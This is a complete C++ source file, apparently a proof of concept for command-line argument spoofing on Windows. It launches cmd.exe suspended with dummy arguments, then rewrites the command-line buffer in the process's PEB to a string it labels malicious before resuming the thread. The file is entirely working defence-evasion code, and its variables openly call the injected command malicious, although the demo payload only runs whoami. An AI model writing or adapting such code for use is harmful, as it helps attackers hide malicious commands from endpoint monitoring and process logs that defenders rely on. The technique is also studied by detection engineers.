#include <Windows.h>
#include <stdio.h>
#include "myStruct.h"  // define PEB, RTL_USER_PROCESS_PARAMETERS, etc.

int main(void) {
    STARTUPINFOA si = {}; PROCESS_INFORMATION pi = {};
    CONTEXT ctx = {CONTEXT_FULL};
    PEB childPeb;
    RTL_USER_PROCESS_PARAMETERS childProcParams;
    wchar_t malCmdLine[] = L"/c whoami & echo Does it work? & timeout 30";
    char benignCmdline[] =  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";

    // Create benign process
    if (!CreateProcessA("C:\\Windows\\SysWow64\\cmd.exe", benignCmdline,
        0, 0, 0, CREATE_SUSPENDED, 0, 0, &si, &pi)) {
        fprintf(stderr, "CreateProcessA failed, error: %d\n", GetLastError()); return 1;
    }

    // Get ProcessParameters
    long unsigned int sizeRead = 0;
    if (!GetThreadContext(pi.hThread, &ctx)) {
        fprintf(stderr, "GetThreadContext failed, error: %d\n", GetLastError()); return 1;
    }
    if (!ReadProcessMemory(pi.hProcess, PVOID(ctx.Ebx), &childPeb, sizeof(childPeb), &sizeRead)) {
        fprintf(stderr, "ReadProcessMemory(Peb) failed, error: %d\n", GetLastError()); return 1;
    }
    if (!ReadProcessMemory(pi.hProcess, PVOID(childPeb.ProcessParameters), &childProcParams, sizeof(childProcParams), &sizeRead)) {
        fprintf(stderr, "ReadProcessMemory(ProcParam) failed, error: %d\n", GetLastError()); return 1;
    }

    // Modifly ProcessParameters
    auto len = childProcParams.CommandLine.Length;
    wchar_t* buf = (wchar_t*)malloc(len+5);
    PVOID cmdlineAddr = childProcParams.CommandLine.Buffer;
    if (!ReadProcessMemory(pi.hProcess, cmdlineAddr, buf, len, NULL)) {
        fprintf(stderr, "ReadProcessMemory(Cmdline) failed, error: %d\n", GetLastError()); return 1;
    }
    // printf("original cmdline: %S\n", buf);

    if (!WriteProcessMemory(pi.hProcess,
        cmdlineAddr,
        malCmdLine, sizeof(malCmdLine), NULL)) {
        fprintf(stderr, "WriteProcessMemory failed, error: %d\n", GetLastError()); return 1;
    }

    ResumeThread(pi.hThread);
    return 0;
}
